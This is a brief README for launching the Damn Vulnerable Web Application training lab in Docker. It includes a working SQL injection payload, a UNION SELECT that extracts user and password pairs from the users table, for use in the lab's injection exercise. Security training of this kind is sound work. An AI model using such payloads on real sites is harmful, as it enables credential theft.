# Damn Vulnerable Web Application

docker run -rm -p 80:80 --name dvwa milovbahg/dvwa:latest

Click 'create/reset-db' on the first page, default difficulty is set to impossible (you may want to drop that down!)

Run the following command in the SQL Injection scenario to test:

%' and 1=0 union select null, concat(user,':',password) from users #
